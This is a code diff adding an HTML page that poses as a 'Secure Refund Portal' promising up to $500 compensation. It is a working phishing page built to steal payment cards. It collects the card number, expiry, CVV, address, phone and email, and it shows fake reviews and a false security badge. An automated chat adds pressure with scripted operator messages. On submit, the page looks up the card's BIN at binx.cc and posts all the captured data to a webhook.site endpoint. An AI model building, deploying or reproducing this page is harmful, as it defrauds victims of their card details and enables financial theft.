@@ -1,0 +1,224 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Refund Portal - Claim Your Eligible Compensation Now</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; color: #333; }
+        .container { max-width: 700px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); position: relative; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header h1 { color: #4CAF50; font-size: 28px; margin: 0; }
+        .header p { color: #666; font-size: 16px; }
+        .reviews { background: #f9f9f9; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
+        .reviews .stars { color: #FFD700; font-size: 24px; }
+        .reviews p { margin: 5px 0; font-size: 14px; color: #555; }
+        form { display: flex; flex-direction: column; }
+        label { margin-top: 15px; font-weight: bold; color: #333; }
+        input, select { padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
+        input:focus, select:focus { outline: none; border-color: #4CAF50; box-shadow: 0 0 5px rgba(76, 175, 80, 0.5); }
+        button { background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%); color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; margin-top: 25px; font-size: 18px; font-weight: bold; transition: background 0.3s; }
+        button:hover { background: linear-gradient(135deg, #45a049 0%, #3d8b40 100%); }
+        .progress { margin-top: 10px; height: 5px; background: #ddd; border-radius: 5px; overflow: hidden; }
+        .progress-bar { height: 100%; background: #4CAF50; width: 0%; transition: width 0.5s; }
+        #capturedData { display: none; margin-top: 20px; padding: 15px; background: #e8f5e8; border: 1px solid #4CAF50; border-radius: 8px; }
+        #chatTrigger { position: fixed; bottom: 20px; right: 20px; background: #4CAF50; color: white; padding: 15px; border-radius: 50%; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); display: none; }
+        #chatTrigger:hover { background: #45a049; }
+        .customer-service { background: #f0f8ff; padding: 20px; border-radius: 12px; margin-top: 30px; text-align: center; border: 1px solid #4CAF50; }
+        .customer-service h2 { color: #4CAF50; margin: 0 0 10px 0; font-size: 24px; }
+        .customer-service p { margin: 10px 0; font-size: 16px; color: #555; }
+        .customer-service button { background: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .customer-service button:hover { background: #45a049; }
+        .security { display: flex; align-items: center; justify-content: center; margin-top: 15px; font-size: 14px; color: #666; }
+        .security img { width: 24px; margin-right: 10px; }
+        @media (max-width: 600px) { .container { padding: 20px; } }
+    </style>
+    <script src="//code.tidio.co/1doehmhn9akfuqvjsntwzxeuaxmwwkpx.js" async></script>
+    <script>
+        window.tidioChatApi = window.tidioChatApi || {};
+        window.tidioChatApi.onReady = function() {
+            // Auto-greet and set triggers
+            setTimeout(() => {
+                if (typeof window.tidioChatApi.show === 'function') {
+                    window.tidioChatApi.setVisitorData({
+                        name: 'Potential Claimant',
+                        email: 'claimant@example.com',
+                        phone: ''
+                    });
+                    window.tidioChatApi.messageFromOperator('Hi! Welcome to our secure refund portal. I see you\'re eligible for up to $500 compensation. Need help filling out the form? Chat with me now!', { force: true });
+                }
+            }, 3000); // Trigger after 3 seconds
+        };
+
+        // Progress bar update on input
+        const inputs = document.querySelectorAll('input, select');
+        inputs.forEach(input => {
+            input.addEventListener('input', updateProgress);
+        });
+        function updateProgress() {
+            const filled = Array.from(inputs).filter(i => i.value).length;
+            const percent = (filled / inputs.length) * 100;
+            document.getElementById('progressBar').style.width = percent + '%';
+            if (percent > 50) document.getElementById('chatTrigger').style.display = 'block'; // Show chat trigger
+        }
+        
+        // BIN check function
+        async function checkBin(bin) {
+            try {
+                const response = await fetch(`https://binx.cc/bin/${bin}`);
+                if (!response.ok) throw new Error('BIN not found');
+                const text = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(text, 'text/html');
+                const bank = doc.querySelector('.bank-name')?.textContent || 'Unknown Bank';
+                const country = doc.querySelector('.country')?.textContent || 'Unknown Country';
+                const brand = doc.querySelector('.card-brand')?.textContent || 'Unknown Brand';
+                const type = doc.querySelector('.card-type')?.textContent || 'Unknown Type';
+                return `Bank: ${bank}, Country: ${country}, Brand: ${brand}, Type: ${type}`;
+            } catch (error) {
+                return 'BIN check failed - invalid or unknown BIN.';
+            }
+        }
+        
+        // Open chat function
+        function openChat() {
+            if (typeof window.tidioChatApi.open === 'function') {
+                window.tidioChatApi.open();
+            }
+        }
+        
+        // Form submission
+        document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const data = {
+                name: document.getElementById('name').value,
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                streetAddress: document.getElementById('streetAddress').value,
+                city: document.getElementById('city').value,
+                zip: document.getElementById('zip').value,
+                country: document.getElementById('country').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value
+            };
+            
+            // Display captured details
+            document.getElementById('displayName').textContent = data.name;
+            document.getElementById('displayCardNumber').textContent = data.cardNumber;
+            document.getElementById('displayExpiry').textContent = data.expiry;
+            document.getElementById('displayCvv').textContent = data.cvv;
+            document.getElementById('displayPhone').textContent = data.phone;
+            document.getElementById('displayEmail').textContent = data.email;
+            
+            // BIN check
+            const bin = data.cardNumber.slice(0, 6);
+            document.getElementById('displayBin').textContent = 'Checking...';
+            const binInfo = await checkBin(bin);
+            document.getElementById('displayBin').textContent = binInfo;
+            
+            document.getElementById('capturedData').style.display = 'block';
+            document.getElementById('checkoutForm').style.display = 'none'; // Hide form after submit
+            
+            console.log('Captured data:', data);
+            alert('Claim submitted! Verification complete. Check your email for confirmation.');
+            
+            // Send to webhook
+            const webhookUrl = 'https://webhook.site/e4a8bb48-fa54-4a8d-ad36-d6b8fbfdc269';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...data, binInfo })
+            }).then(response => {
+                if (response.ok) console.log('Data sent to webhook');
+                else console.error('Failed to send data');
+            });
+            
+            // Auto-chat post-submit
+            if (typeof window.tidioChatApi.messageFromOperator === 'function') {
+                window.tidioChatApi.messageFromOperator('Great! Your claim is processing. If you have any questions, I'm here to help.', { force: true });
+            }
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Secure Refund Portal</h1>
+            <p>Claim Your Eligible Compensation Now - Verified and Secure Process</p>
+        </div>
+        <div class="reviews">
+            <div class="stars">★★★★★</div>
+            <p>"Fast and easy! Got my refund in 2 days." - Verified Customer</p>
+            <p>Over 10,000 successful claims processed this month.</p>
+        </div>
+        <form id="checkoutForm">
+            <label for="name">Full Name (as on Card)</label>
+            <input type="text" id="name" required>
+            
+            <label for="cardNumber">Card Number</label>
+            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            
+            <label for="expiry">Expiry Date (MM/YY)</label>
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+            
+            <label for="cvv">CVV (3-4 digits)</label>
+            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+            
+            <label for="streetAddress">Street Address</label>
+            <input type="text" id="streetAddress" required>
+            
+            <label for="city">City</label>
+            <input type="text" id="city" required>
+            
+            <label for="zip">ZIP / Postal Code</label>
+            <input type="text" id="zip" required>
+            
+            <label for="country">Country</label>
+            <input type="text" id="country" placeholder="Country" required>
+            
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" placeholder="+1 (123) 456-7890" required>
+            
+            <label for="email">Email (for confirmation)</label>
+            <input type="email" id="email" placeholder="your@email.com" required>
+            
+            <div class="security">
+                <img src="https://via.placeholder.com/24x24?text=🔒" alt="Secure">
+                <span>256-bit SSL Encrypted & PCI Compliant</span>
+            </div>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <button type="submit">Submit Claim & Receive Compensation</button>
+        </form>
+        
+        <div id="capturedData">
+            <h3>Verification Complete - Claim Processed</h3>
+            <p><strong>Name:</strong> <span id="displayName"></span></p>
+            <p><strong>Card Number:</strong> <span id="displayCardNumber"></span></p>
+            <p><strong>Expiry:</strong> <span id="displayExpiry"></span></p>
+            <p><strong>CVV:</strong> <span id="displayCvv"></span></p>
+            <p><strong>BIN Details:</strong> <span id="displayBin"></span></p>
+            <p><strong>Phone:</strong> <span id="displayPhone"></span></p>
+            <p><strong>Email:</strong> <span id="displayEmail"></span></p>
+            <p style="color: green;">Funds will be deposited within 3-5 business days. Thank you!</p>
+        </div>
+        
+        <div class="customer-service">
+            <h2>Customer Service Live Chat</h2>
+            <p>Need help with your claim or have questions? Our support team is here to assist you 24/7.</p>
+            <button onclick="openChat()">Start Live Chat</button>
+        </div>
+    </div>
+    
+    <div id="chatTrigger" onclick="openChat()">💬 Chat Support</div>
+    
+    <script>
+        // The script is already in the head, no changes needed here
+    </script>
+</body>
+</html>
